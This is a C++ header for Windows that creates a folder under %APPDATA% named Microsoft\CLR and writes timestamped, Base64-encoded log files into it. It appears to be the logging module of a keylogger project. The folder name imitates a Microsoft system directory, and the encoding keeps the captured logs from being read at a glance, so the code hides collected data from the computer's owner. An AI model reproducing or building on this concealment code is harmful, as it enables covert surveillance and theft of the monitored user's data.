#ifndef IN_OUT_H

#define IN_OUT_H
#include<string>
#include<windows.h>
#include<cstdlib>
#include<fstream>
#include"helper.h"
#include"base64.h"

namespace inout
{
    std::string path(const bool sep = false) //dir to files
    {
        std::string dir(getenv("APPDATA")); //env dir -- appdata dir
        std::string fdir = dir+"\\Microsoft\\CLR";    //our path
        return fdir + (sep ? "\\" : "");
    }

    bool mk1dir(std::string path)           //make missing dir one dir
    {
        return (bool)CreateDirectory(path.c_str(),NULL) || (GetLastError()==ERROR_ALREADY_EXISTS); //converts path to char array
    }

    bool mkdir(std::string path)    //make total path
    {
        for(char &c:path)
        {
            if(c=='\\')
            {
                c='\0';
                if(!mk1dir(path))
                    return false;   //cant make dir
                c='\\';
            }
        }
        return true;    //dir made
    }

    template <class T>
    std::string log_writer(const T &t)
    {
        std::string fpath = path(true);
        HELPER::datetime dt;
        std::string fname = dt.getdatetimestring("_")+".log";
        try
        {
            std::ofstream file(fpath+fname);
            if(!file)
                return "try error";
            std::ostringstream s;
            s << "[" << dt.getdatetimestring() << "]" << std::endl << t << std::endl;
            std::string d = Base64::enc(s.str());
            file << d;
            file.close();
            return fname;
        }
        catch(...)
        {
            return "catch error";
        }
    }


}

#endif // IN_OUT_H
